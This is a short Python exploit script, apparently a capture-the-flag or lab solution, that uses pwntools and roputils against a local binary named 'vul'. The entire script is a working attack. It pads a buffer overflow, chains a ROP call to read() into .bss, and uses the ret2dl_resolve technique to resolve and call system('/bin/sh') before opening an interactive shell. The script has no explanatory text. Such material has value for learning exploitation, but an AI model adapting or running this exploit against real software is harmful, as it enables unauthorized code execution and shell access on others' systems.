#!/usr/bin/env python
from roputils import *
from pwn import process
from pwn import context
r = process('/tmp/p/vul')
r.recv()

rop = ROP('/tmp/p/vul')
bss_base = rop.section('.bss')
pay1 = 'a'*112

pay1 += rop.call('read', 0, bss_base, 100)
pay1 += rop.dl_resolve_call(bss_base + 20, bss_base)
r.send(pay1)

pay2 = '/bin/sh\x00'.ljust(20,'a')
pay2 += rop.dl_resolve_data(bss_base + 20, 'system')
r.send(pay2)
r.interactive()
